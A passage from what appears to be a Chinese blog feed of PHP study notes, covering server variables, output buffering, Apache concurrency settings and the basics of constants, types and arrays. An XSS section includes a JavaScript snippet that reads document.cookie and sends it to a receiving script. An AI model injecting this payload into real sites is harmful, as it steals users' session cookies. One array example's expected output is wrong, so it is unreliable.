如果脚本是通过HTTPS协议被访问，则被设为一个非空的值</span><br><span class="line">REMOTE_ADDR 浏览当前页面的用户的IP地址 // 127.0.0.1</span><br><span class="line">REMOTE_HOST 浏览当前页面的用户的主机名</span><br><span class="line">REMOTE_PORT 用户机器上连接到Web服务器所使用的端口号 // 49197</span><br><span class="line">REMOTE_USER 经验证的用户</span><br><span class="line">REDIRECT_REMOTE_USER 验证的用户，如果请求已在内部重定向</span><br><span class="line">SCRIPT_FILENAME 当前执行脚本的绝对路径 // C:/Users/Administrator/Desktop/dir/demo.php</span><br><span class="line">SERVER_ADMIN 该值指明了Apache服务器配置文件中的SERVER_ADMIN参数 //admin@shocker.com</span><br><span class="line">SERVER_PORT Web服务器使用的端口 // 80</span><br><span class="line">SERVER_SIGNATURE 包含了服务器版本和虚拟主机名的字符串</span><br><span class="line">PATH_TRANSLATED 当前脚本所在文件系统（非文档根目录）的基本路径</span><br><span class="line">SCRIPT_NAME 当前脚本的路径 // /dir/demo.php</span><br><span class="line">REQUEST_URI URI用来指定要访问的页面 // /dir/demo.php?a=aaa&amp;b=bbb</span><br><span class="line">PHP_AUTH_DIGEST 客户端发送的“Authorization” HTTP头内容</span><br><span class="line">PHP_AUTH_PW 用户输入的密码</span><br><span class="line">AUTH_TYPE 认证的类型</span><br><span class="line">PATH_INFO 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息</span><br><span class="line">ORIG_PATH_INFO 在被PHP处理之前，“PATH_INFO”的原始版本</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 缓存 */</span><br><span class="line">1. ob缓存(输出缓存)(需开启)</span><br><span class="line">    php.ini设置中开启并设置输出缓存大小：output_buffering = 4096</span><br><span class="line">    ob_start()  开启当前脚本页面的输出缓存</span><br><span class="line">    如果输出缓存打开，则输出的数据先放到输出缓存(header函数前可以有输出)，否则直接放入程序缓存。</span><br><span class="line">    header()函数发送的内容直接放入程序缓存。</span><br><span class="line">    开启输出缓存后，输出缓存数据会刷新到程序缓存，然后有Apache封装成http响应包返回给浏览器。</span><br><span class="line">    输出缓存：存放的数据是从开启输出缓存开始返回给浏览器的所有静态页面数据！</span><br><span class="line">2. 程序缓存(内部缓存，必须存在，不能关闭)</span><br><span class="line">3. 浏览器缓存</span><br><span class="line"> </span><br><span class="line">/* ob缓存(输出控制) */ Output Buffering</span><br><span class="line">ob_start()  //打开一个输出缓冲区，所有的输出信息不再直接发送到浏览器，而是保存在输出缓冲区里面。</span><br><span class="line">    ob_start(&#x27;ob_gzhandler&#x27;); //将gz编码的数据发送到支持压缩页面的浏览器</span><br><span class="line"> </span><br><span class="line">ob_clean();            //删除内部缓冲区的内容，不关闭缓冲区(不输出)。</span><br><span class="line">ob_end_clean();        //删除内部缓冲区的内容，关闭缓冲区(不输出)。</span><br><span class="line">ob_get_clean();        //返回内部缓冲区的内容，关闭缓冲区。相当于执行ob_get_contents()与ob_end_clean()</span><br><span class="line">ob_flush();            //发送内部缓冲区的内容到浏览器，删除缓冲区的内容，不关闭缓冲区。</span><br><span class="line">ob_end_flush();        //发送内部缓冲区的内容到浏览器，删除缓冲区的内容，关闭缓冲区。</span><br><span class="line">ob_get_flush();        //返回内部缓冲区的内容，并关闭缓冲区，再释放缓冲区的内容。相当于ob_end_flush()并返回缓冲区内容。</span><br><span class="line">flush();               //将当前为止程序的所有输出发送到用户的浏览器</span><br><span class="line"> </span><br><span class="line">ob_get_contents();     //返回缓冲区的内容，不输出。</span><br><span class="line">ob_get_length();       //返回内部缓冲区的长度，如果缓冲区未被激活，该函数返回FALSE。</span><br><span class="line">ob_get_level();        //Return the nesting level of the output buffering mechanism.</span><br><span class="line">ob_get_status();       //获取ob状态信息</span><br><span class="line"> </span><br><span class="line">ob_implicit_flush();   //打开或关闭绝对刷新，默认为关闭，打开后ob_implicit_flush(true)，所谓绝对刷新，即当有输出语句(e.g: echo)被执行时，便把输出直接发送到浏览器，而不再需要调用flush()或等到脚本结束时才输出。</span><br><span class="line"> </span><br><span class="line">ob_gzhandler               //ob_start回调函数，用gzip压缩缓冲区的内容。</span><br><span class="line">ob_list_handlers           //List all output handlers in use</span><br><span class="line">output_add_rewrite_var     //Add URL rewriter values</span><br><span class="line">output_reset_rewrite_vars  //Reset URL rewriter values</span><br><span class="line"> </span><br><span class="line">这些函数的行为受php_ini设置的影响：</span><br><span class="line">output_buffering       //该值为ON时，将在所有脚本中使用输出控制；若该值为一个数字，则代表缓冲区的最大字节限制，当缓存内容达到该上限时将会自动向浏览器输出当前的缓冲区里的内容。</span><br><span class="line">output_handler         //该选项可将脚本所有的输出，重定向到一个函数。例如，将 output_handler 设置为 mb_output_handler() 时，字符的编码将被修改为指定的编码。设置的任何处理函数，将自动的处理输出缓冲。</span><br><span class="line">implicit_flush         //作用同ob_implicit_flush，默认为Off。</span><br><span class="line"> </span><br><span class="line">//ob缓存作用</span><br><span class="line">1)防止在浏览器有输出之后再使用setcookie()、header()或session_start()等发送头文件的函数造成的错误。其实这样的用法少用为好，养成良好的代码习惯。</span><br><span class="line">2)捕捉对一些不可获取的函数的输出，比如phpinfo()会输出一大堆的HTML，但是我们无法用一个变量例如$info=phpinfo();来捕捉，这时候ob就管用了。</span><br><span class="line">3)对输出的内容进行处理，例如进行gzip压缩，例如进行简繁转换，例如进行一些字符串替换。</span><br><span class="line">4)生成静态文件，其实就是捕捉整页的输出，然后存成文件。经常在生成HTML，或者整页缓存中使用。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 网站并发 */</span><br><span class="line">测试工具：apache/bin/ab.exe</span><br><span class="line">用法：cmd&#123;%apache-bin%&#125;&gt;ab.exe -n 执行访问次数 -c 用户并发数量 URL地址</span><br><span class="line">MPM(多路处理模块)：perfork(预处理模式), worker(工作者模式), winnt(Win系统)</span><br><span class="line">MPM配置：httpd-mpm.conf</span><br><span class="line">查看当前MPM模式：httpd –l    mpm_xxx.c中xxx表示当前模式类型</span><br><span class="line">httpd.conf配置(开启MPM)：#Include conf/extra/httpd-mpm.conf</span><br><span class="line">#参考配置</span><br><span class="line">#配置文件：extra/httpd-mpm.conf</span><br><span class="line">#mpm_winnt.c</span><br><span class="line">&lt;IfModule mpm_winnt_module&gt;</span><br><span class="line">    ThreadsPerChild      1000   #中型网站1500-5500合理</span><br><span class="line">    MaxRequestsPerChild  0</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">#mpm_prefork.c</span><br><span class="line">&lt;IfModule mpm_prefork_module&gt;</span><br><span class="line">    StartServers    5       #预先启动</span><br><span class="line">    MinSpareServers 5</span><br><span class="line">    MaxSpareServers 10      #最大空闲进程</span><br><span class="line">    ServerLimit     1500    #用于修改apache编程参数</span><br><span class="line">    MaxClients      1000    #最大并发数</span><br><span class="line">    MaxRequestsPerChild 0   #一个进程对应的线程数，对worker更用</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">#如果你的网站pv值上百万</span><br><span class="line">ServerLimit     2500   #用于修改apache编程参数</span><br><span class="line">MaxClients      2000   #最大并发数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 静态化 */</span><br><span class="line">1. 页面URL长度不超过255字节</span><br><span class="line">2. meta信息尽量完整，keywords5个左右</span><br><span class="line">3. 前端不要使用框架</span><br><span class="line">4. 图片alt属性添加信息</span><br><span class="line">5. 静态页面不要带动态值</span><br><span class="line"> </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot; src=&quot;url&quot;&gt;&lt;/script&gt;</span><br><span class="line">url可以是js/php/图片等，返回的数据替换&lt;script&gt;标签所在位置的内容！相当于简单的Ajax</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* Apache压缩 */</span><br><span class="line">gzip/deflate</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* XSS*** */</span><br><span class="line">#恶意JS代码</span><br><span class="line">#不规则HTML代码</span><br><span class="line"> </span><br><span class="line">开源过滤器：htmlpurifier</span><br><span class="line"> </span><br><span class="line">//获取COOKIE</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var c = document.cookie; //获取COOKIE</span><br><span class="line">var script = document.createElement(&#x27;script&#x27;); //创建script标签</span><br><span class="line">script.src = &#x27;demo.php?c=&#x27; + c; //发送到指定的文件接收</span><br><span class="line">document.body.appendChild(script); //添加到DOM对象中生效</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 命令行CLI */</span><br><span class="line">//显示帮助信息</span><br><span class="line">php -h</span><br><span class="line">//解析并运行-f选项给定的文件名</span><br><span class="line">php [-f] &lt;file&gt; [--] [args...]</span><br><span class="line">//在命令行内运行单行PHP代码</span><br><span class="line">php [options] -r &lt;code&gt; [--] [args...]</span><br><span class="line">无需加上PHP的起始和结束标识符，否则将会导致语法解析错误</span><br><span class="line">//调用phpinfo()函数并显示出结果</span><br><span class="line">php -i/--info</span><br><span class="line">//检查PHP语法</span><br><span class="line">php -l/--syntax-check</span><br><span class="line">//打印出内置以及已加载的PHP及Zend模块</span><br><span class="line">php -m/--modules</span><br><span class="line">//将PHP，PHP SAPI和Zend的版本信息写入标准输出</span><br><span class="line">php -v/--version</span><br><span class="line"> </span><br><span class="line">//参数接收</span><br><span class="line">$argv    传递给脚本的参数数组</span><br><span class="line">    第一个参数总是当前脚本的文件名，因此$argv[0]就是脚本文件名</span><br><span class="line">$argc    传递给脚本的参数数目</span><br><span class="line">    脚本的文件名总是作为参数传递给当前脚本，因此$argc的最小值为1</span><br><span class="line">包含当运行于命令行下时传递给当前脚本的参数的数组</span><br><span class="line">此两个变量仅在register_argc_argv打开时可用</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 设计模式 */</span><br><span class="line">单例模式：为一个类生成一个唯一的对象。使用单例模式生成一个对象后，该对象可以被其它众多对象所使用。</span><br><span class="line">工厂模式：封装对象的建立过程。可以在对象本身创建对象工厂或者是一个额外的工厂类</span><br><span class="line">MVC模式：用户-&gt;控制器-&gt;模型-&gt;控制器-&gt;视图-&gt;控制器-&gt;用户</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 配置选项 */</span><br><span class="line">set_time_limit($seconds) //设置脚本最大执行时间(默认30秒)，0表示不限制</span><br><span class="line">ini_get($varname) //获取一个配置选项的值</span><br><span class="line">ini_set($varname, $newvalue) //为一个配置选项设置值</span><br><span class="line">extension_loaded($ext_name) //检测一个扩展是否已经加载</span><br><span class="line">get_extension_funcs($ext_name) //返回模块函数名的数组</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【其他】 */</span><br><span class="line">version_compare(str $ver1, str $ver2 [,str $operator])  //比较版本号</span><br><span class="line">    $operator表示操作符，可选：&lt;, lt, &lt;=, le, &gt;, gt, &gt;=, ge, ==, =, eq, !=, &lt;&gt;, ne</span><br><span class="line">    如果省略$operator，返回两个版本号的差值。</span><br><span class="line">符号@    用于抑制系统运行错误的报告显示</span><br><span class="line">memory_get_usage    //获取当期内存使用情况</span><br><span class="line">memory_get_peak_usage   //获取内存使用的峰值</span><br><span class="line">getrusage   //获取CPU使用情况(Windows不可用)</span><br><span class="line">uniqid([$prefix])   //获取一个带前缀、基于当前时间微秒数的唯一ID</span><br><span class="line">highlight_string($str [,$return])   //字符串的语法高亮</span><br><span class="line">    $return：设置为TRUE，高亮后的代码不会被打印输出，而是以字符串的形式返回。高亮成功返回TRUE，否则返回FALSE。</span><br><span class="line">highlight_file($file [,$return])    //语法高亮一个文件</span><br><span class="line">__halt_compiler     //中断编译器的执行</span><br><span class="line">get_browser     //获取浏览器具有的功能</span><br><span class="line">    get_browser ([ string $user_agent [, bool $return_array = false ]] )</span><br><span class="line">    如果设置为 TRUE，该函数会返回一个 array，而不是 object</span><br><span class="line">eval($code) //把字符串作为PHP代码执行</span><br><span class="line">gzcompress($str [,$level=-1])   //压缩字符串</span><br><span class="line">gzuncompress($str)  //解压缩字符串</span><br><span class="line">gzencode($str [,$level=-1])   //压缩字符串</span><br><span class="line">gzdecode($str)  //解压缩字符串</span><br><span class="line">ignore_user_abort($bool) //设置客户端断开连接时是否中断脚本的执行</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>PHP开发基础2</title>
    <url>/2023/04/20/php%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%802/</url>
    <content><![CDATA[<h2 id="1-2-常量"><a href="#1-2-常量" class="headerlink" title="1.2  常量"></a>1.2  常量</h2><p>在整个运行过程中，固定不变的值</p>
<h4 id="1-2-1-定义常量"><a href="#1-2-1-定义常量" class="headerlink" title="1.2.1  定义常量"></a>1.2.1  定义常量</h4><p>1、用define()函数定义常量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">define(常量名，值，[是否区别大小写])  true表示不区分大小写，默认是false</span><br><span class="line"></span><br><span class="line">常量名前没有$符</span><br><span class="line">常量名推荐使用大写</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NAME&#x27;</span>,<span class="string">&#x27;tom&#x27;</span>);		<span class="comment">//定义常量</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>,<span class="literal">true</span>);		<span class="comment">//定义常量,不区分大小写</span></span><br><span class="line"><span class="keyword">echo</span> NAME,<span class="string">&#x27;&lt;br&gt;&#x27;</span>,Pi;</span><br><span class="line"><span class="comment">//true表示不区分大小写，默认是区分大小写的。</span></span><br></pre></td></tr></table></figure>

<p>2、定义常量可以用特殊字符，但是在调用的时候必须用<code>constant</code>关键字调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;%-%&#x27;</span>,<span class="string">&#x27;tom&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">constant</span>(<span class="string">&#x27;%-%&#x27;</span>);		<span class="comment">//通过constant获取特殊字符作为常量名的常量</span></span><br></pre></td></tr></table></figure>

<p>3、判断常量是否定义，通过defined()判断常量是否已经定义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;NAME&#x27;</span>))&#123;	</span><br><span class="line">	<span class="title function_ invoke__">define</span>(<span class="string">&#x27;NAME&#x27;</span>,<span class="string">&#x27;berry&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> NAME;	<span class="comment">//berry</span></span><br></pre></td></tr></table></figure>

<p>4、还可以使用const关键字定义常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">NAME</span>=<span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> NAME;		<span class="comment">//tom</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、定义常量有两种方式，define()和const</p>
<p>2、常量在整个运行过程中值保持不变，常量不能重新定义</p>
<p>3、使用constant获取特殊字符做的常量名的值</p>
<p>4、defined()用来判断常量是否被定义</p>
<h4 id="1-2-2-预定义常量"><a href="#1-2-2-预定义常量" class="headerlink" title="1.2.2  预定义常量"></a>1.2.2  预定义常量</h4><p>PHP预先定义好的常量</p>
<p>例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> PHP_VERSION,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//PHP版本号</span></span><br><span class="line"><span class="keyword">echo</span> PHP_OS,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;				<span class="comment">//PHP操作系统</span></span><br><span class="line"><span class="keyword">echo</span> PHP_INT_MAX,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//PHP中整型的最大值	</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-魔术常量"><a href="#1-2-3-魔术常量" class="headerlink" title="1.2.3  魔术常量"></a>1.2.3  魔术常量</h4><p>  魔术常量它们的值随着它们在代码中的位置改变而改变</p>
<p><img src="/images/image-20230222120735861.png" alt="image-20230222120735861"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//获取当前行号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//文件的完整路径和文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__DIR__</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//文件所在的目录</span></span><br></pre></td></tr></table></figure>









<h2 id="1-3-数据类型"><a href="#1-3-数据类型" class="headerlink" title="1.3  数据类型"></a>1.3  数据类型</h2><p>数据类型有两种：强类型和弱类型</p>
<p>PHP是弱类型,JS 是弱类型</p>
<h4 id="1-3-1-基本类型（标量类型）"><a href="#1-3-1-基本类型（标量类型）" class="headerlink" title="1.3.1  基本类型（标量类型）"></a>1.3.1  基本类型（标量类型）</h4><p>1、整型</p>
<p>存整数，PHP_INT_MAX获取整形最大值</p>
<p>PHP支持8、10、16进制的整数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">10</span>;		<span class="comment">//十进制</span></span><br><span class="line"><span class="variable">$num2</span>=<span class="number">010</span>;		<span class="comment">//八进制（数字前面加0）</span></span><br><span class="line"><span class="variable">$num3</span>=<span class="number">0x10</span>;		<span class="comment">//十六进制（数字前面加0x）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num1</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num2</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num3</span>;				<span class="comment">//16</span></span><br></pre></td></tr></table></figure>

<p>进制转换</p>
<table>
<thead>
<tr>
<th>机制</th>
<th>缩写</th>
<th>单词</th>
</tr>
</thead>
<tbody><tr>
<td>十进制</td>
<td>dec</td>
<td>decimalist</td>
</tr>
<tr>
<td>二进制</td>
<td>bin</td>
<td>binary</td>
</tr>
<tr>
<td>八进制</td>
<td>oct</td>
<td>octonary</td>
</tr>
<tr>
<td>十六进制</td>
<td>hex</td>
<td>hexdecimalist</td>
</tr>
</tbody></table>
<p>例题</p>
<p>PHP提供了进制转换函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decbin</span>(<span class="number">123</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;   <span class="comment">//十进制转二进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bindec</span>(<span class="number">1111011</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//二进制转十进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="number">123</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//十进制转十六进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hexdec</span>(<span class="string">&#x27;7b&#x27;</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//十六进制转十进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="number">123</span>);				<span class="comment">//十进制转八进制</span></span><br></pre></td></tr></table></figure>



<p>2、浮点型</p>
<p>浮点数在内存中保存的是近似值</p>
<p>浮点数不能参与比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0.9</span>==(<span class="number">1</span>-<span class="number">0.1</span>));		<span class="comment">//bool(true) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0.1</span>==(<span class="number">1</span>-<span class="number">0.9</span>));		<span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure>

<p>如果浮点数要比较，必须确定比较的位数</p>
<p>bccomp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0.9</span>==(<span class="number">1</span>-<span class="number">0.1</span>));		<span class="comment">//bool(true) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0.1</span>&gt;(<span class="number">1</span>-<span class="number">0.9</span>));		<span class="comment">//bool(false) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bccomp</span>(<span class="number">0.1</span>,<span class="number">1</span>-<span class="number">0.9</span>,<span class="number">5</span>));	<span class="comment">//比较小数点后面5位   int(0)   0表示相等</span></span><br></pre></td></tr></table></figure>

<p>提醒：如果一个整数超出了整形的范围，会自动的转成浮点型</p>
<p>3、布尔型(bool&#x3D;&#x3D;&gt;0,1)</p>
<p>不能使用echo 和print输出布尔型，要使用var_dump()输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$flag</span>);	<span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure>



<p>4、字符串型</p>
<p>在PHP中单引号字符串和双引号字符串是有区别的</p>
<p>单引号字符串是真正的字符串</p>
<p>双引号字符串要解析字符串中的变量</p>
<p>中文编码设置的两种方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">在后端设置</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在前端页面设置</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;编码设置&lt;/title&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;&lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;我的名字叫$name&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//我的名字叫$name</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我的名字叫<span class="subst">$name</span>&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//我的名字叫tom</span></span><br></pre></td></tr></table></figure>

<p>例题：{  }取变量值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$name是我的名字&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//$name是我的名字</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>是我的名字&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//tom是我的名字</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;name&#125;是我的名字&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//tom是我的名字</span></span><br></pre></td></tr></table></figure>

<p>输出特殊字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>&quot;</span>,<span class="string">&#x27;：\&#x27;XXX\&#x27;&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//  tom:&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件保存在c:\\&#x27;</span>;   		<span class="comment">//	c:\</span></span><br></pre></td></tr></table></figure>

<p>字符串定界符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用&lt;&lt;&lt;开头，后面跟的是标识符</span><br><span class="line">2、字符串定界符的结束符必须顶格写，前面不能有任何的空白字符</span><br><span class="line">3、字符串定界符分为两种，heredoc（双引号），nowdoc（单引号）</span><br></pre></td></tr></table></figure>





<h4 id="1-3-2-复合类型"><a href="#1-3-2-复合类型" class="headerlink" title="1.3.2  复合类型"></a>1.3.2  复合类型</h4><p><strong>1、数组</strong></p>
<p>在PHP中数组有两种形式，索引数组和关联数组</p>
<p>索引数组：用整数做下标，默认从0开始，后面依次加一</p>
<p>关联数组：用字符串做下标，通过‘ &#x3D;&gt; ’符号将下标和值关联起来</p>
<p>例题：数组的声明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1、索引数组的声明</span></span><br><span class="line"><span class="variable">$stu</span>=<span class="keyword">array</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;berry&#x27;</span>,<span class="string">&#x27;ketty&#x27;</span>);   <span class="comment">//索引数组</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>);	<span class="comment">//输出数组  Array ( [0] =&gt; tom [1] =&gt; berry [2] =&gt; ketty ) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="number">0</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//tom</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="number">1</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//berry</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="number">2</span>],<span class="string">&#x27;&lt;hr&gt;&#x27;</span>;	<span class="comment">//ketty</span></span><br><span class="line">------------------------------------------</span><br><span class="line"><span class="comment">//2、关联数组</span></span><br><span class="line"><span class="variable">$emp</span>=<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;李白&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">22</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$emp</span>);	<span class="comment">//Array ( [name] =&gt; 李白 [sex] =&gt; 男 [age] =&gt; 22 ) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$emp</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//李白</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$emp</span>[<span class="string">&#x27;sex&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//男</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$emp</span>[<span class="string">&#x27;age&#x27;</span>];			<span class="comment">//22</span></span><br></pre></td></tr></table></figure>

<p>练习：写出数组的下标</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);   <span class="comment">//  Array ( [1] =&gt; a [2] =&gt; b [3] =&gt; c [4] =&gt; d) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">--------------------------</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">5</span>=&gt;<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);  <span class="comment">//  Array ( [1] =&gt; a [2] =&gt; b [3] =&gt; c [5] =&gt; d) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">----------------------------</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span 